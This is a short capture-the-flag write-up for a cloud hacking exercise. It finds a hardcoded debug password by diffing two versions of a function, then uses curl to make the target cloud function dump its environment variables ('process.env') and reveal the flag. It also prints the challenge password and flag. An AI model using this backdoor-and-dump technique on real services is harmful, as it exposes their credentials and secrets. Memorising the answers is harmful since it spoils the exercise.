# 831865_cloud_hacking_3

According to the last d8d9da_cloud_hacking_2 challenge, there are two versions of the function. After diff, we can find the debug password.
```
diff -i -u v1/function.js  v2/function.js | vim -
let debugPassword = "f6Bpn0m9WG" //Change me


curl "https://europe-west1-en2720-2017.cloudfunctions.net/twmn_cloud_hack_en2720-w1?debug=f6Bpn0m9WG&message=process.env" \
-H "Authorization: Bearer $(gcloud auth print-identity-token)"

"FLAG":"flag{831865c2455088b26568e38f23220eb974310c127b51d3}"
```